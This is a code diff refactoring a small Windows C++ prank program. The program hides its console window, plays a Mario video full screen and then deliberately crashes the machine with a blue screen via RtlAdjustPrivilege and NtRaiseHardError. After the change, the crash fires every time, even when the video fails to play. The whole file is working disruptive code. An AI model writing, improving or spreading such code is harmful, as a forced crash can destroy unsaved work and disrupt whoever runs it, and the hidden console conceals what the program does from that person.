@@ -1,5 +1,5 @@
-#include <Windows.h>
-#include <Dshow.h>
+#include <windows.h>
+#include <dshow.h>
 
 // pragmas for libraries needed
 #pragma comment(lib, "ntdll.lib") 		// bsod stuff
@@ -17,17 +17,18 @@ IMediaControl *control = 0; 	// media control interface
 IMediaEvent   *event = 0; 		// media event interface
 IVideoWindow  *window = 0;		// the video window
 
-// helpful functions
-void initialize_directshow(LPCWSTR path) {
-	CoInitialize(NULL); // initialize the COM
+// helper functions
+void InitializeDirectShow(LPCWSTR path) {
+	// initialize the COM
+	CoInitialize(NULL);
 
 	// create the filter graph manager
-	CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void **)&graph);
+	CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
 	
-	// get addition interfaces for it
-	graph->QueryInterface(IID_IMediaControl, (void **)&control);
-	graph->QueryInterface(IID_IMediaEvent, (void **)&event);
-	graph->QueryInterface(IID_IVideoWindow, (void **)&window);
+	// get all needed addition interfaces
+	graph->QueryInterface(IID_IMediaControl, (void**)&control);
+	graph->QueryInterface(IID_IMediaEvent, (void**)&event);
+	graph->QueryInterface(IID_IVideoWindow, (void**)&window);
 
 	// attempt to build the graph for file playback
 	graph->RenderFile(path, NULL);
@@ -36,31 +37,33 @@ void initialize_directshow(LPCWSTR path) {
 	window->put_FullScreenMode(OATRUE);
 }
 
-unsigned long trigger_bsod() {
+ULONG TriggerBSOD() {
 	BOOLEAN state;
-	unsigned long response;
+	ULONG response;
 
-	RtlAdjustPrivilege(19, TRUE, FALSE, &state);
-	NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &response);
+	RtlAdjustPrivilege(19, TRUE, FALSE, &state); // adjust privileges to allow raising BSoD
+	NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &response); // raise BSoD
 
 	return response;
 }
 
-// main code here
+// main function
 int main() {
+	HRESULT result;
+	LONG code;
+
 	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window
-	initialize_directshow(L"mario.wmv");
+	InitializeDirectShow(L"mario.wmv"); // initialize directshow stuff
 
-	HRESULT result = control->Run();
+	result = control->Run(); // play the video
 
-	if (!SUCCEEDED(result)) { // just trigger a BSOD if it can't play the video
-		trigger_bsod();
+	if (SUCCEEDED(result)) {
+		event->WaitForCompletion(INFINITE, &code); // wait for video to finish
 	}
 
-	long code = 0;
-	event->WaitForCompletion(INFINITE, &code);
+	// trigger the blue screen of death
+	TriggerBSOD();
 
-	trigger_bsod();
-
+	// if it gets here, the BSoD failed :(
 	return 1;
 }
